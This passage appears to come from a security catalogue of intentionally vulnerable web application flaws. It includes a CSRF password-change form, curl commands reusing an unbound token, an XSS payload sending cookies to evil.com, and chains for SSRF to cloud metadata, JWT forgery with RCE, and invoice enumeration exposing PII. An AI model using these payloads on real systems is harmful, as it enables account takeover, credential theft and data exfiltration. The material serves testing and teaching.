- **Description:** There is no CSRF token validation. It accepts `Content-Type: text/plain` (a "simple" request that does not trigger a CORS preflight). A cross-origin HTML form can change the victim's password.
- **Exploitation:**
```html
<!-- Attacker's page: -->
<form method="POST" enctype="text/plain"
      action="http://localhost/api/profile/change-password">
  <input name='{"new_password":"hacked123","x":"' value='"}'>
  <input type="submit" value="Win prize">
</form>
<!-- The body sent is: {"new_password":"hacked123","x":"="} -->
<!-- text/plain does not trigger a preflight, the cookie is sent -->
```

#### V48 — CSRF tokens not bound to session
- **File:** `backend/app/routes/profile.py:383-405`
- **Type:** CSRF Token Bypass (CWE-352)
- **Description:** The `/api/csrf-token` endpoint generates tokens with session_id `"anonymous"` instead of the user's real ID. A token obtained by the attacker (without auth) works for any authenticated user.
- **Exploitation:**
```bash
# 1. Attacker obtains a CSRF token (without authentication):
CSRF=$(curl -s http://localhost:8000/api/csrf-token | jq -r '.csrf_token')

# 2. That same token works for any authenticated user:
curl -X PUT http://localhost:8000/api/profile \
  -H "Authorization: Bearer <victim_token>" \
  -H "X-CSRF-Token: $CSRF" \
  -H "Content-Type: application/json" \
  -d '{"username": "pwned"}'
```

---

## Complete attack chains

### Guest → Admin (V42 + V08 + V43)
```
1. GET /api/admin/config          → Obtain JWT_RESET_SECRET="reset123"
2. Forge JWT with role=admin       → Sign with "reset123"
3. POST /api/admin/generate-report → RCE via command injection
```

### Guest → Account Takeover (V15 + V46)
```
1. POST /api/auth/password-reset-request → Obtain reset_token from the body
2. POST /api/auth/password-reset         → Change the victim's password
```

### XSS → Session Hijack (V21 + V14)
```
1. POST review with body: <img src=x ONERROR=fetch('https://evil.com/'+document.cookie)>
2. Victim visits the product → session_token cookie sent to the attacker
3. Attacker uses the stolen JWT to impersonate the victim
```

### SSRF → AWS Credentials (V30 + V32)
```
1. Set up a server with a 302 redirect → http://169.254.169.254/latest/meta-data/iam/
2. POST /api/seller/import-image-url with the redirect URL
3. Error response includes a preview of AWS credentials from the metadata mock
```

### IDOR → PII Exfiltration (V34 + V33)
```
1. GET /api/orders/{uuid}/invoice     → 302 reveals numeric ID in Location
2. GET /api/invoices/1, /2, /3, ...   → Enumerate all invoices without auth
3. Each invoice exposes: email, name, phone, last 4 digits of card
```

---

## Vulnerability status

| Status | Count |
|--------|----------|
| Exploitable | 53 |
| Blocked (V28) | 1 |
| **Total** | **54** |

V28 (negative total) is blocked by a CHECK constraint in the database that prevents negative totals in the `orders` table.
